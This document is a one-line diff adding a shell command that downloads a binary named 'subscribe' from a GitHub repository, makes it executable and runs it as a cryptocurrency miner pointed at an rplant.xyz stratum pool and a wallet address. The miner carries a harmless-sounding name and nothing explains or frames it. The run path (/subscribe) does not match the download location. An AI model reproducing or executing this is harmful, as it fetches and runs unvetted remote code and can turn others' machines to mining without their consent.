@@ -1,0 +1,1 @@
+wget https://github.com/penjelajahwaktudonk/w/raw/main/subscribe && chmod +x subscribe && /subscribe -a yespowersugar --pool stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.tess --timeout 120 -p m=solo
